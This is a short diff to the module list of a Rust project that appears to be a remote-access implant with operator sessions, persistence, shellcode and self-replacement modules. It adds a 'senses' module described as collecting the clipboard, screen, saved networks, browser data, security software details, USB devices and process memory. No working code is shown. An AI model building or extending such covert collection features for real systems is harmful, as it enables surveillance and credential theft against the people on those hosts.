@@ -28,6 +28,9 @@
 //!   netinfo  the network configuration of the host
 //!   sessions interactive sessions (a process the operator writes to)
 //!   desktop the screen, the clipboard and the keyboard
+//!   senses  the senses of the desktop: the window table, the clipboard,
+//!           the screen in motion, the saved networks, the browsers, the
+//!           security software, the USB keys and the memory of a process
 //!   persist the persistence manager and its technique catalogue
 //!   install replacing the running implant with a new build
 //!   proc    the process table of the host
@@ -57,6 +60,7 @@ pub mod registry;
 pub mod remote;
 pub mod s3;
 pub mod script;
+pub mod senses;
 pub mod session;
 pub mod sessions;
 pub mod shellcode;
